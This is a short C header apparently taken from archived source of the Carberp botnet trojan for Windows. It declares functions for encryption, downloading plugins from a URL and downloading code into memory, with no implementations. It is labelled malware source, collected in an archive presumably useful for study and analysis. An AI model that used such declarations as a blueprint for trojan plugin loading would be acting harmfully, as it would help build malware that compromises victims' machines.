/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#pragma once

DWORD Crypt( char* lpPassword, LPBYTE lpResult, DWORD dwSize );
LPVOID DownloadPlugin( char *Url, DWORD *dwLen );
bool DownloadInMem( char *Url, LPBYTE *lpMem, LPDWORD dwSize );
